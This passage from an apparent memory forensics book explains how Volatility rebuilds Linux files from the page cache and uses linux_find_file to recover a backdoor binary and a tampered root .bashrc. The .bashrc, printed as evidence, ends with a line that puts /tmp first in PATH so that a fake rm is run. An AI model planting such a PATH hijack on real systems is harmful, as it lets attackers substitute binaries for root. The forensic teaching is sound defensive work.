+     Key Points
+     The key points are these:
+
+        • page_tree: The root of the radix tree that holds a particular file’s pages. Enumerating
+          this tree in the correct order reveals all the file’s contents.
+        • a_ops: A pointer to the address_space_operations structure of the address space.
+          It defines a number of operations on the address space, such as reading, writing,
+          and freeing pages.
+        • backing_dev_info: A pointer to the device (for example, hard drive) structure that
+          holds the file.
+
+      NOTE
+      You should not confuse the address_space structure with Volatility’s internal notion
+      of address spaces that it uses to support CPU address translation.
+
+     File Extraction Algorithm
+     To reconstruct a file’s contents, you must traverse the tree of its pages. This tree, which is
+     part of the page cache, stores the address of the struct page for each cached physical page
+     of the file. You can convert the struct page to an actual physical page in order to recover
+     the file contents. Volatility accomplishes this by mimicking the page cache traversal code
+     inside the kernel. First, you must calculate the index of each page in the tree. The index is
+     the page number of the page of interest; you calculate all the indexes by simply dividing
+     the file offset by page size (4096). If the index is 0, use a constant offset to find the struct
+     page. If the index is greater than 0, you must find the corresponding node of the tree. You
+     then use a node’s height in the tree to traverse the node’s slots until you find the one for
+     a given index.
+
+    The tree lookup produces the address of a struct page within the kernel virtual
+address space. To find the physical address of the page, you index into the mem_map array
+(mem_map is an array of page structures that map each page of the physical memory). Once
+the physical offset is obtained, Volatility reads the contained data. Volatility performs
+this algorithm for each page of the file and joins the data together to form the contiguous
+file. If a page is not present, it is filled with zeroes in order to maintain spatial integrity.
+
+Find File Plugin
+You previously saw how to recover an entire file system in memory using linux_recover
+_filesystem. If you only want to extract single files from the page cache, you can use the
+linux_find_file plugin. The plugin operates in two modes: the first uses the -F/--find
+parameter to determine whether a file is within the page cache; the second uses the
+-i/--inode and -O/--outfile options to extract the file. In Chapter 21, we analyzed a mem-
+ory sample that had a backdoor running from /tmp/backdoor. Using linux_find_file,
+you can extract the file for analysis:
+  $ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime
+         linux_find_file -F /tmp/backdoor
+  Volatility Foundation Volatility Framework 2.4
+  Inode Number                  Inode
+  ---------------- ------------------
+           1059161 0xffff88000b96f4d8
+
+  $ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime
+       linux_find_file -i 0xffff88000b96f4d8 -O backdoor.dump
+  Volatility Foundation Volatility Framework 2.4
+
+  $ file backdoor.dump
+  backdoor-dump: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
+  dynamically linked (uses shared libs), for GNU/Linux 2.6.26,
+         BuildID[sha1]=0x36c8848c0aa617cbdc6db0a16c91b8bee69f63cb, not stripped
+
+   In the first invocation, the address of the inode structure (0xffff88000b96f4d8) is
+returned, and the second invocation writes this file from memory to disk named back-
+door.dump. You can then load this file into IDA Pro and other binary-analysis tools to
+determine its functionality (see Figure 24-2).
+    In this figure, you see the main function and that its first operation is to overwrite the
+command-line parameters. The aApache2 label points to three null-separated strings of
+arguments (apache2, -k, start) in the binary’s read-only (.rodata) section. This pointer
+is then passed to memcpy. The functionality successfully overwrites the command-line
+arguments shown by ps on a running system, as you saw in Chapter 21.
+
+     Figure 24-2: Disassembly of the main function in IDA Pro after
+     dumping the malicious binary from memory
+
+        Also in Chapter 21, you analyzed a memory sample that had a malicious rm binary
+     installed in /tmp. The fake rm binary would not delete files with filenames starting with
+     v0l. The attacker ensured the use of this rm binary by prepending /tmp to the PATH vari-
+     able of the root account within root’s .bashrc file:
+        $ python vol.py --profile=LinuxDebian-3_2x64 -f backdooredrm.lime
+           linux_find_file -F /root/.bashrc
+        Volatility Foundation Volatility Framework 2.4
+        Inode Number                  Inode
+        ---------------- ------------------
+                 1059172 0xffff88000ba26800
+
+        $ python vol.py --profile=LinuxDebian-3_2x64 -f backdooredrm.lime
+           linux_find_file -i 0xffff88000ba26800 -O malicious.bashrc
+        Volatility Foundation Volatility Framework 2.4
+
+        $ cat malicious.bashrc
+        # ~/.bashrc: executed by bash(1) for non-login shells.
+
+        # Note: PS1 and umask are already set in /etc/profile. You should not
+        # need this unless you want different defaults for root.
+        # PS1='${debian_chroot:+($debian_chroot)}\h:\w\$ '
+        # umask 022
+
+        # You may uncomment the following lines if you want `ls' to be colorized:
+        # export LS_OPTIONS='--color=auto'
+        # eval "`dircolors`"
+        # alias ls='ls $LS_OPTIONS'
+        # alias ll='ls $LS_OPTIONS -l'
+        # alias l='ls $LS_OPTIONS -lA'
+
+  #
+  # Some more alias to avoid making mistakes:
+  # alias rm='rm -i'
+  # alias cp='cp -i'
+  # alias mv='mv -i'
+
+  shopt -s histappend
+  PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
+
+  PATH=/tmp:$PATH
+
+   The last line of the .bashrc file is /tmp being prepended to the existing PATH variable,
+which makes bash check /tmp for applications before checking the normal system direc-
+tories (/bin, /sbin, etc.). Furthermore, in the same way that the /tmp/backdoor file was
+extracted, you can extract /tmp/rm for further analysis.
+
+Summary
+A fundamental capability of the Linux operating system is supporting a wide range of file
+systems. Some of the file systems are more volatile than others, specifically the temporary
+ones that disappear once a system is powered down. By leveraging memory forensics, you
+can not only gain access to the metadata for files and directories on these file systems (such
+as timestamps and ownership information), but you can also extract recently accessed
+portions of the file content. Furthermore, in the same way that you generated timelines for
+Windows systems in Chapter 18, you can also create timelines to help correlate temporal
+relationships amongst evidence in Linux memory dumps.
